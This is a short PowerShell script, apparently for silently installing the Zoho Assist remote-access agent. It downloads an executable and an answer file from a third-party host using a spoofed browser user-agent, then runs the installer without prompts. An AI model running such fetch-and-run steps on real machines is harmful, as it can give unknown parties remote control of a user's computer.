# Zoho Assist unattended install - WebDAV/HTTPS edition
$ErrorActionPreference = 'Stop'
$exe = "$env:TEMP\ZA_Access.exe"
$iss = "$env:TEMP\ZohoAssistAgent.iss"
$ua  = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

curl.exe -sS -L -f -A $ua -o $exe "https://dav.shakras.org/ZA_Access.exe"
curl.exe -sS -L -f -A $ua -o $iss "https://dav.shakras.org/ZohoAssistAgent.iss"

$len = (Get-Item $exe).Length
if ($len -lt 30000000) { throw "EXE short: $len bytes" }

Start-Process -FilePath $exe -ArgumentList ('/y /q /f"' + $iss + '"') -Wait
